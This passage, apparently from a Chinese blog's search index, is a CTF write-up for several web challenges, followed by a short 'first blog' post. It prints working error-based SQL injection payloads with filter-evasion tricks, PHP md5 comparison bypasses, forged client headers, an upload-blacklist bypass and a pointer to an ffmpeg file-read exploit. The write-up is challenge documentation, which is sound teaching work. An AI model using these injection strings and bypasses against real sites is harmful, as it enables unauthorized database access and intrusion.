意思是a和b的值和类型都要相同。</p><p>!=和！===的区别和上述类似。</p><p>2.大致了解了基本含义之后剖析题目，这个if语句成立的条件是s1和s2的值和类型都不相同，并且其经过MD5加密之后的值和类型要完全相同。看起来有点绕，并且毫无思路。看了一个博客就get了，附上链接<a href="http://www.cnblogs.com/weidiao/p/6821812.html。" target="_blank" rel="external">http://www.cnblogs.com/weidiao/p/6821812.html。</a></p><p>3.可以知道，如果将s1和s2都变为数组，并且值不同，便可以满足if的条件，得到flag。<br>关键语句</p><pre><code>if ($_POST[&#39;s1&#39;] !== $_POST[&#39;s2&#39;] &amp;&amp; md5($_POST[&#39;s1&#39;]) === md5($_POST[&#39;s2&#39;])) { echo $flag; }</code></pre><p>这个很容易就想到是利用md5处理数组的漏洞了吧，构造如下即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222354_648.png" alt=""></p><h3 id="PHP的悖论2"><a href="#PHP的悖论2" class="headerlink" title="PHP的悖论2"></a>PHP的悖论2</h3><p>题目：</p><p><a href="http://game.sycsec.com:2009/20022.php" target="_blank" rel="external">http://game.sycsec.com:2009/20022.php</a></p><p>解题思路：<br>仔细看看会发现‘===’变成了‘==’，于是只需要值相等，网上搜了搜字符串不同但MD5相等</p><pre><code>if ($_POST[&#39;s1&#39;] !== $_POST[&#39;s2&#39;] &amp;&amp; md5($_POST[&#39;s1&#39;]) == md5($_POST[&#39;s2&#39;])) { echo $flag; }</code></pre><p>于是构造payload：<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222354_397.png" alt=""><br>240610708<br>s878926199a<br>SYC{Y0u_g0th3w4y_to_k111==}</p><h3 id="视频播放器"><a href="#视频播放器" class="headerlink" title="视频播放器"></a>视频播放器</h3><p>这个还是非常好玩儿的，利用的是一个ffmpeg的漏洞，这个原理有些厉害了，但是利用过程十分简单<br><a href="http://www.freebuf.com/vuls/138377.html" target="_blank" rel="external">http://www.freebuf.com/vuls/138377.html</a><br>然后下载源码，生成恶意文件<br>然后上传恶意文件即可读到flag<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222355_205.png" alt=""></p><p>SYC{WhatIsExpFuckNoLiaoDe???}</p><h3 id="iPhone-X"><a href="#iPhone-X" class="headerlink" title="iPhone X"></a>iPhone X</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>题目提示要iPhone X访问，需要UA头包含CPU iPhone OS X字样，之后提示IP不符合规则，同时修改xff和ref头尾127.0.0.1得到flag</p><pre><code>GET /web_competition/geekCompetition/web_3/ HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS X like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/13D15 UCBrowser/10.9.15.793 Mobile Gecko/20100101 Firefox/55.0Referer: 127.0.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3X-FORWARDED-FOR: 127.0.0.1Connection: closeUpgrade-Insecure-Requests: 1</code></pre><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>0x01 抓包<br>0x02 改包<br>由于题目说只有iphoneX才能接受这个website，所以联想到要将user-agent改为iPhone的版本。<br>如图，好不容易找到iphone的user-agent，它却说ip不对，改x-forward-for为127.0.0.1，没懂hh。用modify headers，于是来到第三步。<br><img src="http://oy0tigw51.bkt.clouddn.com/201711230000_413.png" alt=""></p><p>0x03 改IP</p><p>看网上的安装和使用的博客，于是得到如图<br><img src="http://oy0tigw51.bkt.clouddn.com/201711222358_212.png" alt=""><br>0x04 Get_the_flag</p><p>改了之后重新抓包，改包，go了之后发现还是一样，黑人问号？？？一定是modify headers没用对，返回看了下，发现还要点个start，难受了。<br>再来一遍抓包改包，得到flag。</p><p>Tip：之后发现可以直接在repeater里加X-Forwarded-For:127.0.0.1，也能拿到flag。</p><p>SYC{UA_AND_IP_COULD_BE<em>FORGED</em>!!!}</p><h3 id="Clound的错误"><a href="#Clound的错误" class="headerlink" title="Clound的错误"></a>Clound的错误</h3><pre><code>http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=&#39;f1ag&#39; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#39;flag&#39; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23http://game.sycsec.com:2007/?sycid=1&#39;+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,f4ag,0x7e) FROM f1ag.flag LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></pre><h3 id="大大的标题"><a href="#大大的标题" class="headerlink" title="大大的标题"></a>大大的标题</h3><p>首先看到了标题是upload是一个文件上传的问题，首先扫描一下目录直接发现存在源码泄露?1.zip文件下载得到源码<br>一开始最关键的代码在这里</p><p>$file_ext  = substr( $file_name, strrpos( $uploaded_name, ‘.’ ) + 1);</p><p>这个是检测最后一个点的位置，类似于解析漏洞是的，但是怎么也没想到就是单纯的后缀名过滤不全…<br>我们看着</p><p>$allow_ext=array(“php”,”php3”,”php4”,”php5”,”phpt”,”phtml”);</p><p>是不是少了什么…比如说.pht，结果随便一试试就出来了</p><p>SYC{CLound-upL0ad}</p><h3 id="Clound的错误2"><a href="#Clound的错误2" class="headerlink" title="Clound的错误2"></a>Clound的错误2</h3><p>过滤了空格用%a0绕过，过滤了注释用;%00绕过<br>过滤了or使用oorr绕过,过滤的其他关键词使用+绕过whe+re</p><pre><code>sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0group_concat(SCHEMA_NAME)%a0fr+om%a0infoorrmation_schema.SCHEMATA)),0x7e));%00sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0group_concat(table_name)%a0fr+om%a0infoorrmation_schema.tables%a0whe+re%a0table_schema=&#39;f1ag&#39;)),0x7e));%00sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0column_name%a0fr+om%a0infoorrmation_schema.columns%a0whe+re%a0table_name=&#39;flag&#39;%a0limit%a00,1)),0x7e));%00sycid=1&#39;%a0a+nd%a0(updatexml(0x3a,concat(0x7e,(sel+ect%a0f4ag%a0fr+om%a0f1ag.flag)),0x7e));%00</code></pre><p>flag:SYC{Err0R_sQl_inj2}</p><p>二进制不会慢慢学<br>re：<br><a href="http://www.cnblogs.com/L1B0/p/7763016.html" target="_blank" rel="external">http://www.cnblogs.com/L1B0/p/7763016.html</a><br><a href="http://blog.sycsec.com/" target="_blank" rel="external">http://blog.sycsec.com/</a><br><a href="http://blog.csdn.net/qq_35078631/article/details/78308518" target="_blank" rel="external">http://blog.csdn.net/qq_35078631/article/details/78308518</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>my-first-blog</title>
      <link href="/archives/e53fb0b9/"/>
      <url>/archives/e53fb0b9/</url>
      
        <content type="html"><![CDATA[<p>description:<br>和以往一样，一个博客的开篇都有这么一个开始，几乎所到之处都有一个相似的开始，他的名字叫做Hello World。当然这里也一样，也是从hello world开始的。你好，世界！</p><hr>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> first-blog </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
